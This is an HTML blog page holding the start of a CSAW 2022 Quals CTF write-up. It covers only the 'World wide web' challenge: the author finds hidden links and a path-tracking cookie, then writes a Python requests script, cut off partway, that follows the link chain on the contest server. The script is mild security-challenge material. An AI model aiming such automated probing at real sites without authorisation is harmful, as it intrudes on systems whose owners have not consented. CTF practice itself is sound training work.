3x[data-hover]{background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);height:var(--chakra-sizes-full);}.css-1ciw33x:active,.css-1ciw33x[data-active]{background:var(--chakra-colors-gray-300);}@media screen and (min-width: 30em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 48em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 62em){.css-1ciw33x{grid-column-start:12;}}</style><button type="button" class="chakra-button css-1ciw33x" aria-label="theme switcher"><svg height="35" width="35" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg></button></div><style data-emotion="css dh3o7u">.css-dh3o7u{display:none;z-index:var(--chakra-zIndices-banner);position:fixed;right:var(--chakra-space-5);top:20%;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}@media screen and (min-width: 30em){.css-dh3o7u{display:none;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}}@media screen and (min-width: 48em){.css-dh3o7u{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}@media screen and (min-width: 62em){.css-dh3o7u{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}</style><div spacing="1" class="css-dh3o7u"><style data-emotion="css 1syov5e">.css-1syov5e{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;}.css-1syov5e:hover,.css-1syov5e[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightSecondary);}.css-1syov5e:focus,.css-1syov5e[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1syov5e" href="https://www.facebook.com/yassine.belkhadm/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path></svg></a><a class="chakra-link css-1syov5e" href="https://www.linkedin.com/in/yassine-belkhadem-396266204/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zM349.3 793.7H230.6V411.9h118.7v381.8zm-59.3-434a68.8 68.8 0 1 1 68.8-68.8c-.1 38-30.9 68.8-68.8 68.8zm503.7 434H675.1V608c0-44.3-.8-101.2-61.7-101.2-61.7 0-71.2 48.2-71.2 98v188.9H423.7V411.9h113.8v52.2h1.6c15.8-30 54.5-61.7 112.3-61.7 120.2 0 142.3 79.1 142.3 181.9v209.4z"></path></svg></a><style data-emotion="css j0ra30">.css-j0ra30{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;padding:var(--chakra-space-1);background-color:var(--chakra-colors-lightSecondary);}.css-j0ra30:hover,.css-j0ra30[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightBackground);}.css-j0ra30:focus,.css-j0ra30[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-j0ra30" href="/assets/YassineBelkhademCV.pdf"><svg width="30" height="30" viewBox="0 0 61 44" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="61" height="43" transform="translate(0 0.5)" fill="white"></rect><path d="M26.2354 20.0312C26.2354 18.8594 26.1084 17.9316 25.8545 17.248C25.6006 16.5645 25.1807 16.0469 24.5947 15.6953C24.0088 15.3438 23.2373 15.1191 22.2803 15.0215C21.333 14.9238 20.1562 14.875 18.75 14.875H12.1729C10.9229 14.875 9.86816 14.9141 9.00879 14.9922C8.15918 15.0605 7.45605 15.207 6.89941 15.4316C6.34277 15.6562 5.91309 15.9785 5.61035 16.3984C5.30762 16.8184 5.08789 17.375 4.95117 18.0684C4.81445 18.7617 4.73633 19.6162 4.7168 20.6318C4.69727 21.6377 4.6875 22.8438 4.6875 24.25C4.6875 25.6562 4.69727 26.8672 4.7168 27.8828C4.74609 28.8887 4.8291 29.7383 4.96582 30.4316C5.10254 31.125 5.31738 31.6816 5.61035 32.1016C5.91309 32.5215 6.34277 32.8438 6.89941 33.0684C7.45605 33.293 8.15918 33.4443 9.00879 33.5225C9.86816 33.5908 10.9229 33.625 12.1729 33.625H18.75C19.8438 33.625 20.7861 33.5957 21.5771 33.5371C22.3682 33.4785 23.042 33.3711 23.5986 33.2148C24.1553 33.0586 24.6045 32.8438 24.9463 32.5703C25.2881 32.2969 25.5518 31.9551 25.7373 31.5449C25.9326 31.125 26.0645 30.627 26.1328 30.0508C26.2012 29.4648 26.2354 28.7812 26.2354 28H29.0479C29.0479 28.9375 28.9893 29.7871 28.8721 30.5488C28.7549 31.3008 28.5449 31.9746 28.2422 32.5703C27.9492 33.1562 27.5537 33.6641 27.0557 34.0938C26.5576 34.5234 25.9277 34.8799 25.166 35.1631C24.4043 35.4365 23.4961 35.6367 22.4414 35.7637C21.3867 35.9004 20.1562 35.9688 18.75 35.9688H12.1729C10.4541 35.9688 9.00391 35.8613 7.82227 35.6465C6.65039 35.4414 5.68359 35.1289 4.92188 34.709C4.16016 34.2793 3.56934 33.7422 3.14941 33.0977C2.73926 32.4531 2.43652 31.6963 2.24121 30.8271C2.05566 29.958 1.94824 28.9766 1.91895 27.8828C1.88965 26.7891 1.875 25.5781 1.875 24.25C1.875 22.9219 1.88965 21.7109 1.91895 20.6172C1.94824 19.5234 2.05566 18.542 2.24121 17.6729C2.43652 16.8037 2.73926 16.0469 3.14941 15.4023C3.56934 14.7578 4.16016 14.2256 4.92188 13.8057C5.68359 13.376 6.65039 13.0586 7.82227 12.8535C9.00391 12.6387 10.4541 12.5312 12.1729 12.5312H18.75C20.1562 12.5312 21.3867 12.5996 22.4414 12.7363C23.4961 12.8633 24.4043 13.0635 25.166 13.3369C25.9277 13.6006 26.5576 13.9375 27.0557 14.3477C27.5537 14.7578 27.9492 15.2412 28.2422 15.7979C28.5449 16.3545 28.7549 16.9844 28.8721 17.6875C28.9893 18.3906 29.0479 19.1719 29.0479 20.0312H26.2354ZM56.7188 13H60L47.8125 35.5H44.0625L31.875 13H35.1562L45.9375 33.625L56.7188 13Z" fill="#16222A"></path></svg></a></div><style data-emotion="css vdrwix">.css-vdrwix{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;height:var(--chakra-sizes-full);overflow-y:scroll;overflow-x:hidden;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;z-index:var(--chakra-zIndices-base);position:relative;}</style><div class="css-vdrwix"><style data-emotion="css 148e81f">.css-148e81f{min-height:100px;height:16vh;}</style><div id="navbar-placeholder" class="css-148e81f"></div><style data-emotion="css 14dh39v">.css-14dh39v{margin-left:10%;}</style><div href="/blog" class="css-14dh39v"><style data-emotion="css 1n5thfy">.css-1n5thfy{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-1n5thfy:hover,.css-1n5thfy[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-1n5thfy:focus,.css-1n5thfy[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1n5thfy"><style data-emotion="css onkibi">.css-onkibi{width:1em;height:1em;display:inline-block;line-height:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;color:currentColor;vertical-align:middle;}</style><svg viewBox="0 0 24 24" focusable="false" class="chakra-icon css-onkibi"><path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg><style data-emotion="css w9j3m0">.css-w9j3m0{margin-left:var(--chakra-space-2);font-size:var(--chakra-fontSizes-2xl);font-weight:var(--chakra-fontWeights-bold);}</style><p class="chakra-text css-w9j3m0"> <!-- -->Go Back</p></a></div><style data-emotion="css 1isl2s1">.css-1isl2s1{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;max-width:1300px;-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}.css-1isl2s1>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}@media screen and (min-width: 30em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 48em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 62em){.css-1isl2s1{-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;}}</style><div class="chakra-stack css-1isl2s1"><style data-emotion="css cf3ii7">.css-cf3ii7{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:var(--chakra-fontSizes-3xl);line-height:1.33;color:#536073;text-align:center;}@media screen and (min-width: 30em){.css-cf3ii7{font-size:var(--chakra-fontSizes-4xl);}}@media screen and (min-width: 48em){.css-cf3ii7{font-size:var(--chakra-fontSizes-6xl);line-height:1.2;}}@media screen and (min-width: 62em){.css-cf3ii7{font-size:var(--chakra-fontSizes-7xl);}}</style><h2 class="chakra-heading css-cf3ii7">CSAW 2K22 Quals - Writeups</h2><style data-emotion="css 1sd0gdo">.css-1sd0gdo{color:var(--chakra-colors-lightSecondary);}</style><p class="chakra-text css-1sd0gdo">2022-09-11</p><style data-emotion="css uxb30m">.css-uxb30m{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-uxb30m>*:not(style)~*:not(style){margin-top:0px;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0.5rem;margin-inline-start:0.5rem;}</style><div class="chakra-stack css-uxb30m"><style data-emotion="css d1mco7">.css-d1mco7{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;vertical-align:top;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;max-width:100%;font-weight:var(--chakra-fontWeights-medium);line-height:1.2;outline:2px solid transparent;outline-offset:2px;min-height:1.5rem;min-width:1.5rem;font-size:var(--chakra-fontSizes-md);border-radius:var(--chakra-radii-md);-webkit-padding-start:var(--chakra-space-2);padding-inline-start:var(--chakra-space-2);-webkit-padding-end:var(--chakra-space-2);padding-inline-end:var(--chakra-space-2);background:var(--chakra-colors-gray-100);color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-cardDark2);-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-d1mco7:focus,.css-d1mco7[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><span class="css-d1mco7">Cybersecurtiy</span><span class="css-d1mco7">Writeups</span><span class="css-d1mco7">Event</span><span class="css-d1mco7">CTF</span><span class="css-d1mco7">S0ter14</span></div><style data-emotion="css xgff9b">.css-xgff9b{height:32px;}</style><div class="css-xgff9b"></div><style data-emotion="css p1kl7j">.css-p1kl7j{border-radius:2px;box-shadow:var(--chakra-shadows-md);-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}@media screen and (min-width: 30em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}}@media screen and (min-width: 48em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 62em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}</style><div class="css-p1kl7j"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271200%27%20height=%27900%27/%3e"/></span><img alt="CSAW 2K22 Quals - Writeups cover image" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="CSAW 2K22 Quals - Writeups cover image" src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609975/large_csaw_blog_main_98bebe18a4.jpg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><style data-emotion="css wzua3q">.css-wzua3q{opacity:0.6;border:0;border-color:inherit;border-style:solid;border-bottom-width:1px;width:100%;max-width:1200px;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);}</style><hr aria-orientation="horizontal" class="chakra-divider css-wzua3q"/><style data-emotion="css pr1uvm">.css-pr1uvm{width:100%;max-width:1300px;-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}@media screen and (min-width: 30em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 48em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}@media screen and (min-width: 62em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}</style><div class="blogPost css-pr1uvm"><style data-emotion="css 1yzq3sl">.css-1yzq3sl{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:48px;line-height:1.33;color:#B17BBA;margin-top:var(--chakra-space-14);margin-bottom:var(--chakra-space-10);}@media screen and (min-width: 48em){.css-1yzq3sl{line-height:1.2;}}</style><h1 class="chakra-heading css-1yzq3sl">CSAW 2K22 Quals</h1>
<p class="chakra-text css-0" node="[object Object]">My team Soter1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^.</p>
<style data-emotion="css 1uc67dn">.css-1uc67dn{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#FACE7E;margin-top:var(--chakra-space-24);margin-bottom:var(--chakra-space-8);}@media screen and (min-width: 48em){.css-1uc67dn{line-height:1.2;}}</style><h2 class="chakra-heading css-1uc67dn" id="world wide web">World wide web</h2>
<p class="chakra-text css-0" node="[object Object]"><style data-emotion="css bwdt07">.css-bwdt07{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-transparent);margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);position:inherit;--chakra-backdrop-blur:blur(var(--chakra-blur-none));z-index:4;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:auto;height:auto;left:0px;bottom:0px;--chakra-translate-y:50%;}.css-bwdt07>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-bwdt07"><style data-emotion="css 1pb7l90">.css-1pb7l90{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);-webkit-margin-start:var(--chakra-space-1);margin-inline-start:var(--chakra-space-1);-webkit-margin-end:var(--chakra-space-1);margin-inline-end:var(--chakra-space-1);max-width:1300px;position:relative;}.css-1pb7l90>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-1pb7l90"><style data-emotion="css 1ui0t94">.css-1ui0t94{min-width:20vw;max-width:1200px;position:relative;}</style><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png" alt="World wide web" style="scale:1.2px;width:100%"/></div><style data-emotion="css 1qz7fzr">.css-1qz7fzr{-webkit-align-self:center;-ms-flex-item-align:center;align-self:center;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content;text-align:center;}</style><p class="chakra-text css-1qz7fzr">World wide web</p></div></div>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png" alt="world wide web root" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">world wide web root</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png" alt="world wide web /stuff" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">world wide web /stuff</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">I tried to find if there is any other <style data-emotion="css gv9qss">.css-gv9qss{font-weight:700;color:var(--chakra-colors-red-400);font-size:var(--chakra-fontSizes-lg);}</style><span class="chakra-text css-gv9qss">&lt;a&gt;</span> tags in the page.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png" alt="world wide web terminal curl" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">world wide web terminal curl</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Using browser devtool and CTRL+F I did 3 times each time I look for the <span class="chakra-text css-gv9qss">&lt;a&gt;</span> and click on it. Also I noticed that I got a very interesting cookie set.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png" alt="world wide web cookie" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">world wide web cookie</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">solChain</span> well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.</p>
<p class="chakra-text css-0" node="[object Object]">Crafting my final script....</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-py" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">import</span><span> requests
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>url</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&quot;http://web.chal.csaw.io:5010/&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>session </span><span class="token" style="color:#d4d4d4">=</span><span> requests</span><span class="token" style="color:#d4d4d4">.</span><span>Session</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#569CD6">with</span><span> session </span><span class="token" style="color:#d4d4d4">:</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    next_word</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&#x27;stuff&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token" style="color:#569CD6">while</span><span> </span><span class="token" style="color:#569cd6">True</span><span class="token" style="color:#d4d4d4">:</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>        response1</span><span class="token" style="color:#d4d4d4">=</span><span> session</span><span class="token" style="color:#d4d4d4">.</span><span>get</span><span class="token" style="color:#d4d4d4">(</span><span>url</span><span class="token" style="color:#d4d4d4">+</span><span>next_word</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#569CD6">print</span><span class="token" style="color:#d4d4d4">(</span><span>session</span><span class="token" style="color:#d4d4d4">.</span><span>cookies</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        </span><span class="token" style="color:#569CD6">try</span><span class="token" style="color:#d4d4d4">:</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>            startingIndex</span><span class="token" style="color:#d4d4d4">=</span><span>response1</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">.</span><span>index</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;href=&quot;/&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>            endText</span><span class="token" style="color:#d4d4d4">=</span><span>response1</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">[</span><span>startingIndex</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span>index</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;&quot;&gt;&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>        </span><span class="token" style="color:#569CD6">except</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>            </span><span class="token" style="color:#569CD6">print</span><span class="token" style="color:#d4d4d4">(</span><span>response1</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>            </span><span class="token" style="color:#569CD6">break</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>        </span><span class="token" style="color:#569CD6">print</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;next word:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>response1</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">7</span><span class="token" style="color:#d4d4d4">+</span><span>startingIndex</span><span class="token" style="color:#d4d4d4">:</span><span>endText</span><span class="token" style="color:#d4d4d4">+</span><span>startingIndex</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span>
